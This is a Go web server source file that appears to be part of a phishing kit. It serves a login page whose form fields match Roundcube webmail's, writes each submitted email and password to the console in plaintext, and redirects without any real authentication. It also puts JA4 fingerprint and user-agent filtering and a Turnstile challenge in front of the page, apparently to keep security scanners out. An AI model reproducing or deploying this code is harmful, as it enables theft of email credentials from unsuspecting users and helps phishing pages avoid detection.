package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
	"github.com/lulexhostt/authapp/middlewares"
	"gopkg.in/yaml.v2"
)

// BotGuardConfig defines the structure for the YAML configuration.
type BotGuardConfig struct {
	MinVer string `yaml:"min_ver"`
	Ja4    struct {
		Allow []struct {
			B string `yaml:"b"`
		} `yaml:"allow"`
		Deny []struct {
			B string `yaml:"b"`
		} `yaml:"deny"`
	} `yaml:"ja4"`
	UserAgent struct {
		Allow []struct {
			Browser string `yaml:"browser"`
			Version string `yaml:"version"`
		} `yaml:"allow"`
		Deny []struct {
			Browser string `yaml:"browser"`
		} `yaml:"deny"`
	} `yaml:"user_agent"`
}

// loadConfig loads the BotGuard YAML configuration file.
func loadConfig() (*BotGuardConfig, error) {
	configPath, err := filepath.Abs("config/botguard.yaml")
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	var config BotGuardConfig
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	return &config, nil
}

// setCSP sets the Content Security Policy header for security.
func setCSP(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'self'; img-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; frame-src https://challenges.cloudflare.com;")
}

// challengeHandler serves the Turnstile CAPTCHA challenge page.
func challengeHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	// Load and render the challenge.html template
	tmpl, err := template.ParseFiles("templates/challenge.html")
	if err != nil {
		http.Error(w, "Unable to load challenge template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// authHandler handles the login form submission.
func authHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	if r.Method == http.MethodPost {
		r.ParseForm()
		email := r.FormValue("rcmloginuser")
		password := r.FormValue("rcmloginpwd")
		fmt.Printf("Email: %s, Password: %s\n", email, password)
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	// Render the auth.html form template for GET requests
	tmpl, err := template.ParseFiles("templates/auth.html")
	if err != nil {
		http.Error(w, "Unable to load auth template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// TurnstilePreloadMiddleware checks Turnstile CAPTCHA response before serving the requested page.
func TurnstilePreloadMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Check for token in URL query parameters
		token := r.URL.Query().Get("cf-turnstile-response")

		if token == "" {
			// If token is missing, redirect to the challenge page
			http.Redirect(w, r, "/challenge", http.StatusSeeOther)
			return
		}

		// Verify the Turnstile token
		success, err := middlewares.TurnstileVerify(token)
		if err != nil || !success {
			// If verification fails, redirect to the challenge page
			http.Redirect(w, r, "/challenge", http.StatusSeeOther)
			return
		}

		// If Turnstile verification is successful, serve the requested page
		next.ServeHTTP(w, r)
	})
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
	}

	// Load the BotGuard configuration
	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}
	fmt.Printf("Loaded BotGuard config: %+v\n", config)

	// Set up routes and middlewares
	mux := http.NewServeMux()

	// Serve static assets
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// Handle authentication with Turnstile validation
	mux.Handle("/auth", TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))

	// Handle the challenge route
	mux.HandleFunc("/challenge", challengeHandler)

	// Start the server on port 8080
	fmt.Println("Server is running on port 8080...")
	log.Fatal(http.ListenAndServe(":8080", mux))
}
